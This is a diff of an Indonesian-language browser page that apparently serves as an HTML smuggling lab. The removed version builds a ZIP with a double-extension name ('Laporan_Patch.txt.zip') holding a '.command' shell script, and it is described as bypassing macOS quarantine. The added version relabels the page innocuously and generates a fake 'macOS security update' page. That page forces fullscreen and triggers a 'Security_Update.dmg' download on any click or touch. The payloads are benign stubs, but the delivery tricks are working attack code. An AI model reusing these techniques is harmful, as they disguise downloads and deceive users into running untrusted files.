@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Chaining: HTML Smuggling + ZIP Quarantine Bypass</title>
+<title>Generator Berkas Blob &amp; ObjectURL</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -15,20 +15,26 @@ p { margin-bottom: 15px; line-height: 1.5; }
 button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
 button:hover { background: #b71c1c; }
 #status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
+#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
+#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
 </style>
 </head>
+
 <body>
 <div class="panel" id="main-panel">
-<h2>Chaining Attack Lab</h2>
-<p>Uji coba ekstensi ganda untuk mengunduh file ZIP yang berisi script .command (Bypass Quarantine macOS).</p>
+<h2>Generator Berkas Blob &amp; ObjectURL</h2>
+<p>Klik tombol untuk memicu pembuatan halaman yang akan mengeksekusi unduhan file .dmg melalui manipulasi interaksi pengguna.</p>
 
-<button id="start-btn" type="button">Mulai Generate File ZIP</button>
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
+
 <div id="status" role="status">Sistem siap.</div>
+<div id="downloads"></div>
 </div>
 
 <script>
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
+const downloadsDiv = document.getElementById("downloads");
 
 let activeUrls = [];
 let isProcessing = false;
@@ -38,104 +44,131 @@ const speak = (message) => {
         window.speechSynthesis.cancel();
         const utterance = new SpeechSynthesisUtterance(message);
         utterance.lang = 'id-ID';
+        utterance.rate = 1.0;
         window.speechSynthesis.speak(utterance);
     }
 };
 
-// Helper CRC32 untuk membuat ZIP yang valid
-function hitungCRC32(bytes) {
-    var crc = 0xFFFFFFFF;
-    for (var i = 0; i < bytes.length; i++) {
-        crc ^= bytes[i];
-        for (var j = 0; j < 8; j++) {
-            crc = (crc >>> 1) ^ ((crc & 1) ? 0xEDB88320 : 0);
-        }
-    }
-    return (crc ^ 0xFFFFFFFF) >>> 0;
-}
-
-// Membuat file ZIP secara dinamis di dalam browser
-function buatZipBypass() {
-    // 1. Payload shell script (Kalkulator)
-    var shellScript = "#!/bin/bash\n" +
-                      "open -a Calculator\n" +
-                      "osascript -e 'display notification \"Kalkulator dibuka via ZIP Bypass\" with title \"Chaining Lab\"'\n";
-    var contentBytes = new TextEncoder().encode(shellScript);
-    var nameBytes = new TextEncoder().encode("System_Update_Patch.command");
-    var crc = hitungCRC32(contentBytes);
-    
-    // 2. Susun Local File Header
-    var localHeader = new Uint8Array(30 + nameBytes.length);
-    var lh = new DataView(localHeader.buffer);
-    lh.setUint32(0, 0x04034b50, true);
-    lh.setUint16(4, 20, true);
-    lh.setUint16(8, 0, true); // Stored (no compression)
-    lh.setUint32(14, crc, true);
-    lh.setUint32(18, contentBytes.length, true);
-    lh.setUint32(22, contentBytes.length, true);
-    lh.setUint16(26, nameBytes.length, true);
-    localHeader.set(nameBytes, 30);
-
-    // 3. Susun Central Directory
-    var centralDir = new Uint8Array(46 + nameBytes.length);
-    var cd = new DataView(centralDir.buffer);
-    cd.setUint32(0, 0x02014b50, true);
-    cd.setUint16(4, 20, true);
-    cd.setUint16(6, 20, true);
-    cd.setUint32(16, crc, true);
-    cd.setUint32(20, contentBytes.length, true);
-    cd.setUint32(24, contentBytes.length, true);
-    cd.setUint16(28, nameBytes.length, true);
-    cd.setUint32(42, 0, true); // Relative offset
-    centralDir.set(nameBytes, 46);
-
-    // 4. Susun End of Central Directory
-    var eocd = new Uint8Array(22);
-    var eocdView = new DataView(eocd.buffer);
-    eocdView.setUint32(0, 0x06054b50, true);
-    eocdView.setUint16(8, 1, true);
-    eocdView.setUint16(10, 1, true);
-    eocdView.setUint32(12, centralDir.length, true);
-    eocdView.setUint32(16, localHeader.length + contentBytes.length, true);
-
-    // Gabungkan semua bagian ZIP
-    return new Blob([localHeader, contentBytes, centralDir, eocd], { type: 'application/zip' });
-}
+const prepareMimeBlobAsync = (i) => {
+    return new Promise((resolve) => {
+        queueMicrotask(() => {
+            // Payload HTML dengan manipulasi User Gesture
+            const payloadText = "<!DOCTYPE html>" +
+            "<html>" +
+            "<head><meta charset='UTF-8'><title>System Update</title></head>" +
+            "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
+            "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
+            "    <h2 style='color:#4CAF50;margin-bottom:10px;'>⚙️ System Update</h2>" +
+            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Pembaruan keamanan macOS diperlukan. Klik di mana saja pada halaman ini untuk memulai proses instalasi.</p>" +
+            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Menunggu interaksi...</p>" +
+            "    <p style='color:#555;font-size:10px;margin-top:25px;'>Origin: <span id='o'></span></p>" +
+            "</div>" +
+            "<script>" +
+            "(function(){" +
+            "\"use strict\";" +
+            "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
+            
+            // Payload Base64: File DMG tiruan (Header UDIF)
+            "var b64Data = \"koly\\u0000\\u0000\\u0000\\u0004\\u0000\\u0000\\u0002\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\";" +
+            
+            "function b64KeBytes(b64){" +
+            "    var binary = atob(b64);" +
+            "    var len = binary.length;" +
+            "    var bytes = new Uint8Array(len);" +
+            "    for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
+            "    return bytes;" +
+            "}" +
+            
+            "var sudah = false;" +
+            
+            "function picuDownload(){" +
+            "    if (sudah) return;" +
+            "    sudah = true;" +
+            "    var statusEl = document.getElementById('status');" +
+            "    try{" +
+            "        statusEl.textContent = 'Mengekstrak paket...';" +
+            "        var bytesArr = b64KeBytes(b64Data);" +
+            "        var blob = new Blob([bytesArr], { type: 'application/x-apple-diskimage' });" +
+            "        var url = URL.createObjectURL(blob);" +
+            "        " +
+            // Memicu unduhan secara instan dalam stack event click
+            "        var a = document.createElement('a');" +
+            "        a.href = url;" +
+            "        a.download = 'Security_Update.dmg';" +
+            "        a.style.display = 'none';" +
+            "        document.body.appendChild(a);" +
+            "        a.click();" +
+            "        " +
+            "        setTimeout(function(){ " +
+            "            if (a.parentNode) a.parentNode.removeChild(a); " +
+            "            URL.revokeObjectURL(url); " +
+            "        }, 3000);" +
+            "        statusEl.textContent = 'File berhasil diunduh.';" +
+            "        statusEl.style.color = '#4CAF50';" +
+            "    } catch(e){" +
+            "        statusEl.textContent = 'Gagal: ' + e.message;" +
+            "        statusEl.style.color = '#f00';" +
+            "        sudah = false;" +
+            "    }" +
+            "}" +
+            
+            // MANIPULASI GESTURE: Trigger pada event click/touch apa pun di halaman
+            "document.addEventListener('click', picuDownload);" +
+            "document.addEventListener('touchstart', picuDownload);" +
+            "})();" +
+            "<\/script>" +
+            "</body>" +
+            "</html>";
+          
+            const blob = new Blob([payloadText], { type: "text/html" });
+            const url = URL.createObjectURL(blob);
+            resolve({ id: i, url: url });
+        });
+    });
+};
 
 const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
-    
-    // Ekstensi ganda untuk menipu visual pengguna
-    link.download = `Laporan_Patch.txt.zip`; 
-    
+    link.download = `update-paket.txt.html`;
+    link.textContent = `Download update-paket.txt.html`;
     link.style.display = "none";
-    document.body.appendChild(link);
+    downloadsDiv.appendChild(link);
     link.click();
 };
 
-startBtn.addEventListener("click", async () => {
+startBtn.addEventListener("click", () => {
     if (isProcessing) return;
-    isProcessing = true;
-    startBtn.disabled = true;
-    statusDiv.textContent = "Membuat file ZIP...";
-    
-    speak("Membuat paket ZIP.");
 
+    activeUrls.forEach(url => URL.revokeObjectURL(url));
+    activeUrls = [];
+    downloadsDiv.replaceChildren();
+
+    speak("Mengaktifkan mode layar penuh.");
+
+    const root = document.documentElement;
     try {
-        const zipBlob = buatZipBypass();
-        const url = URL.createObjectURL(zipBlob);
-        activeUrls.push(url);
-        
-        triggerInstantDownload({ url: url });
-        
-        statusDiv.textContent = "File Laporan_Patch.txt.zip berhasil diunduh. Silakan ekstrak file tersebut.";
-    } catch(e) {
-        statusDiv.textContent = "Gagal: " + e.message;
+        if (root.requestFullscreen) {
+            root.requestFullscreen();
+        } else if (root.webkitRequestFullscreen) {
+            root.webkitRequestFullscreen();
+        } else if (root.mozRequestFullScreen) {
+            root.mozRequestFullScreen();
+        }
+        statusDiv.textContent = "Mengunci layar penuh...";
+    } catch (err) {
+        console.warn("Fullscreen tidak didukung atau ditolak:", err);
     }
-    
-    isProcessing = false;
-    startBtn.disabled = false;
+
+    setTimeout(async () => {
+        isProcessing = true;
+        speak("Proses pembuatan berkas Blob dimulai.");
+        
+        const fileData = await prepareMimeBlobAsync(1);
+        activeUrls.push(fileData.url);
+        triggerInstantDownload(fileData);
+        statusDiv.textContent = `Selesai: File berhasil dikirim.`;
+    }, 300);
 });
 </script>
 </body>
